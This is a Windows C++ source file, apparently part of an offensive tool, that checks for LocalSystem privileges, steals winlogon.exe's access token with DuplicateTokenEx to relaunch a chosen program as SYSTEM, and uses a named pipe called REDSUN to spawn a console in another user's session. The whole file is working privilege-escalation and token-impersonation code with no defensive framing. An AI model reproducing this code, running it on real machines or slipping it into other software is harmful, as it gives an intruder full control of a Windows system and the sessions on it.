#include "permissions.h"
#include <tlhelp32.h>
#include <iostream>

bool IsRunningAsLocalSystem() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return false;
    }
    TOKEN_USER* tokenUser = (TOKEN_USER*)malloc(MAX_SID_SIZE + sizeof(TOKEN_USER));
    DWORD retSize = 0;
    BOOL ok = GetTokenInformation(hToken, TokenUser, tokenUser, MAX_SID_SIZE + sizeof(TOKEN_USER), &retSize);
    CloseHandle(hToken);
    if (!ok) return false;
    bool isSystem = IsWellKnownSid(tokenUser->User.Sid, WinLocalSystemSid);
    free(tokenUser);
    return isSystem;
}

void LaunchConsoleInSessionId() {
    // Reuse implementation from old_main.cpp (simplified copy)
    HANDLE hPipe = CreateFile(L"\\??\\pipe\\REDSUN", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hPipe == INVALID_HANDLE_VALUE) return;
    DWORD sessionId = 0;
    if (!GetNamedPipeServerSessionId(hPipe, &sessionId)) {
        CloseHandle(hPipe);
        return;
    }
    CloseHandle(hPipe);
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) return;
    HANDLE hNewToken = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &hNewToken)) {
        CloseHandle(hToken);
        return;
    }
    CloseHandle(hToken);
    if (!SetTokenInformation(hNewToken, TokenSessionId, &sessionId, sizeof(DWORD))) {
        CloseHandle(hNewToken);
        return;
    }
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    CreateProcessAsUser(hNewToken, L"C:\\Windows\\System32\\conhost.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    CloseHandle(hNewToken);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
}

static DWORD FindProcessIdByName(const std::wstring& name) {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = {0};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (name == pe.szExeFile) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

bool ElevateToSystem(const std::wstring& exePath) {
    // Find a known SYSTEM process (e.g., winlogon.exe)
    DWORD pid = FindProcessIdByName(L"winlogon.exe");
    if (!pid) return false;
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) return false;
    HANDLE hProcToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hProcToken)) {
        CloseHandle(hProc);
        return false;
    }
    HANDLE hDupToken = NULL;
    if (!DuplicateTokenEx(hProcToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
        CloseHandle(hProcToken);
        CloseHandle(hProc);
        return false;
    }
    // Adjust token privileges if needed (enable SE_ASSIGNPRIMARYTOKEN_NAME, SE_INCREASE_QUOTA_NAME)
    // For brevity we skip explicit privilege adjustment assuming the duplicating process has them.
    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};
    // Launch new instance as SYSTEM
    BOOL ok = CreateProcessAsUserW(hDupToken, exePath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    CloseHandle(hDupToken);
    CloseHandle(hProcToken);
    CloseHandle(hProc);
    if (ok) {
        // Optionally wait or detach. Here we just close handles and exit current process.
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return true;
    }
    return false;
}
